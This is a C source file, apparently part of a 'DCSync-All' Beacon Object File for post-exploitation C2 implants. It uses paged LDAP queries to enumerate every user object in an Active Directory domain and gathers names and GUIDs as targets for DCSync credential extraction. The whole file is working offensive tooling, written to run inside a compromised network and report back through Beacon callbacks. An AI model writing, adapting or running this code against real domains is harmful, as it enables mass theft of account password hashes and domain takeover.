// LDAP utilities for enumerating all users in DCSync-All BOF

#include <windows.h>
#include "../_include/ldap_common.h"

// Import required MSVCRT functions (if not already imported)
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void* __cdecl MSVCRT$realloc(void* ptr, size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* ptr);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t count);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int c, size_t count);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char* dest, const char* src);

// Import required WLDAP32 paging functions
typedef VOID* PLDAPSearch;
struct l_timeval { LONG tv_sec; LONG tv_usec; };
DECLSPEC_IMPORT PLDAPSearch WLDAP32$ldap_search_init_pageA(LDAP*, const char*, ULONG, const char*, char*[], ULONG, LDAPControlA**, LDAPControlA**, ULONG, ULONG, VOID*);
DECLSPEC_IMPORT ULONG       WLDAP32$ldap_get_next_page_s(LDAP*, PLDAPSearch, struct l_timeval*, ULONG, ULONG*, LDAPMessage**);
DECLSPEC_IMPORT ULONG       WLDAP32$ldap_search_abandon_page(LDAP*, PLDAPSearch);

#ifndef LDAP_NO_LIMIT
#define LDAP_NO_LIMIT            0
#endif
#ifndef LDAP_NO_RESULTS_RETURNED
#define LDAP_NO_RESULTS_RETURNED 0x5e
#endif

// Structure to hold user information
typedef struct _USER_INFO {
    char* distinguishedName;
    char* samAccountName;
    GUID objectGuid;
} USER_INFO;

// Enumerate all user objects in the domain
// Returns array of USER_INFO structures and sets userCount
// Caller must free the array and strings within each structure
USER_INFO* EnumerateAllUsers(LDAP* ld, const char* searchBase, int* userCount, int onlyUsers) {
    if (!ld || !searchBase || !userCount) return NULL;
    
    *userCount = 0;
    
    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    // If onlyUsers=1, filter to SAM_USER_OBJECT (0x30000000) and SAM_TRUST_ACCOUNT (0x30000002) only
    char* filter = onlyUsers ? "(&(objectClass=user)(|(sAMAccountType=805306368)(sAMAccountType=805306370)))" : "(objectClass=user)";
    char* attrs[] = { "distinguishedName", "sAMAccountName", "objectGUID", NULL };

    USER_INFO* users = NULL;
    int capacity = 0;
    int index = 0;
    ULONG totalCount = 0;

    PLDAPSearch pageHandle = WLDAP32$ldap_search_init_pageA(
        ld,
        searchBase,
        LDAP_SCOPE_SUBTREE,
        filter,
        attrs,
        0,
        NULL, NULL,
        0,
        LDAP_NO_LIMIT,
        NULL
    );

    if (!pageHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate users: ldap_search_init_page failed");
        return NULL;
    }

    ULONG result;
    while ((result = WLDAP32$ldap_get_next_page_s(ld, pageHandle, NULL, 1000, &totalCount, &searchResult)) == LDAP_SUCCESS) {

        // Count entries
        int count = WLDAP32$ldap_count_entries(ld, searchResult);

        // Allocate/grow array for user info
        if (count > 0 && index + count > capacity) {
            int newCapacity = index + count;
            USER_INFO* tmp = (USER_INFO*)MSVCRT$realloc(users, newCapacity * sizeof(USER_INFO));
            if (!tmp) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for user list");
                WLDAP32$ldap_msgfree(searchResult);
                break;
            }
            users = tmp;
            MSVCRT$memset(users + capacity, 0, (newCapacity - capacity) * sizeof(USER_INFO));
            capacity = newCapacity;
        }

        // Iterate through entries
        entry = WLDAP32$ldap_first_entry(ld, searchResult);

        while (entry && index < capacity) {
            // Get distinguishedName
            char** dnValues = WLDAP32$ldap_get_values(ld, entry, "distinguishedName");
            if (dnValues && dnValues[0]) {
                size_t len = MSVCRT$strlen(dnValues[0]) + 1;
                users[index].distinguishedName = (char*)MSVCRT$malloc(len);
                if (users[index].distinguishedName) {
                    MSVCRT$strcpy(users[index].distinguishedName, dnValues[0]);
                }
                WLDAP32$ldap_value_free(dnValues);
            }

            // Get sAMAccountName
            char** samValues = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
            if (samValues && samValues[0]) {
                size_t len = MSVCRT$strlen(samValues[0]) + 1;
                users[index].samAccountName = (char*)MSVCRT$malloc(len);
                if (users[index].samAccountName) {
                    MSVCRT$strcpy(users[index].samAccountName, samValues[0]);
                }
                WLDAP32$ldap_value_free(samValues);
            }

            // Get objectGUID
            struct berval** guidValues = WLDAP32$ldap_get_values_len(ld, entry, "objectGUID");
            if (guidValues && guidValues[0] && guidValues[0]->bv_len == sizeof(GUID)) {
                MSVCRT$memcpy(&users[index].objectGuid, guidValues[0]->bv_val, sizeof(GUID));
                WLDAP32$ldap_value_free_len(guidValues);
            }

            // Only count users that have all required fields
            if (users[index].distinguishedName && users[index].samAccountName) {
                index++;
            } else {
                // Free incomplete entry
                if (users[index].distinguishedName) MSVCRT$free(users[index].distinguishedName);
                if (users[index].samAccountName) MSVCRT$free(users[index].samAccountName);
                MSVCRT$memset(&users[index], 0, sizeof(USER_INFO));
            }

            entry = WLDAP32$ldap_next_entry(ld, entry);
        }

        WLDAP32$ldap_msgfree(searchResult);
        searchResult = NULL;
    }

    WLDAP32$ldap_search_abandon_page(ld, pageHandle);

    *userCount = index;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully enumerated %d users", index);
    
    return users;
}

// Free user info array
void FreeUserInfoArray(USER_INFO* users, int userCount) {
    if (!users) return;
    
    for (int i = 0; i < userCount; i++) {
        if (users[i].distinguishedName) {
            MSVCRT$free(users[i].distinguishedName);
        }
        if (users[i].samAccountName) {
            MSVCRT$free(users[i].samAccountName);
        }
    }
    
    MSVCRT$free(users);
}
